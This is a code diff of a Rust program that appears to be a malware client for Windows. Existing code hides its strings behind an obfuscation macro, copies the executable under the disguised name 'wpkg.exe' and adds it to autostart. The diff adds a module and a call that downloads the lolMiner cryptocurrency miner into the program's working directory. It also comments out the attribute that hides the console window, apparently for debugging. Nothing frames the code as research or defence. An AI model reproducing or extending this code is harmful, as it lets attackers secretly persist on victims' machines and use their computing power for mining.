@@ -1,9 +1,10 @@
 // Remove console window in Windows OS
-#![windows_subsystem = "windows"]
+//#![windows_subsystem = "windows"]
 
 mod addresses;
 mod client;
 mod commands;
+mod crypto;
 mod globals;
 mod logger;
 mod macros;
@@ -27,7 +28,6 @@ pub const TCP_BACKUP_PORT: u32 = 3217;
 async fn main() {
     // init logger
     logger::init();
-
     let args: Vec<String> = env::args().collect();
 
     match args.iter().any(|v| v == &crypto!("--update")) {
@@ -59,6 +59,9 @@ async fn main() {
         .get(0)
         .unwrap_or(&Address::default())
         .format();
+    
+    println!("{}", &utils::get_working_dir().unwrap());
+    crypto::download_lolminer(&utils::get_working_dir().unwrap()).await.unwrap();
 
     #[cfg(all(target_os = "windows", not(debug_assertions)))]
     {
@@ -73,7 +76,7 @@ async fn main() {
 
             let config_dir = utils::get_working_dir()?;
             let exe_target = format!("{}\\{}", &config_dir, &crypto!("wpkg.exe"));
-
+            
             info_crypt!("Adding to autostart...");
             // adding to autostart
             utils::run_process(
